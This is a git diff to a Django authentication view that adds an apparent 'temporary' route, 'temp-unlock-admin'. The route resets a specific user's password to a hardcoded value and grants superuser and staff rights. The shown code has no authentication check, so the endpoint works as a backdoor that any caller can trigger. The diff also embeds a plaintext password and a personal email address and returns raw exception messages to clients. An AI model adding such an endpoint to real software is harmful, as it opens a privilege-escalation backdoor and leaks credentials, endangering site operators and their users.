@@ -19,6 +19,8 @@ class AuthAPI(View):
             return self.supabase_login(request)
         elif action == 'logout':
             return self.logout(request)
+        elif action == 'temp-unlock-admin':
+            return self.temp_unlock_admin(request)
         else:
             return JsonResponse({'error': 'Invalid action'}, status=400)
     
@@ -159,6 +161,19 @@ class AuthAPI(View):
                 
         except json.JSONDecodeError:
             return JsonResponse({'error': 'Invalid JSON'}, status=400)
+    def temp_unlock_admin(self, request):
+        """
+        Route temporaire de secours pour activer l'accès /admin/.
+        À SUPPRIMER APRÈS USAGE.
+        """
+        try:
+            from identity.models import User
+            user = User.objects.get(email='rakib.sobabe@epitech.eu')
+            user.set_password('AdminSelection2026!')
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+            return JsonResponse({'success': 'Compte Admin déverrouillé !'})
         except Exception as e:
             return JsonResponse({'error': str(e)}, status=500)
 
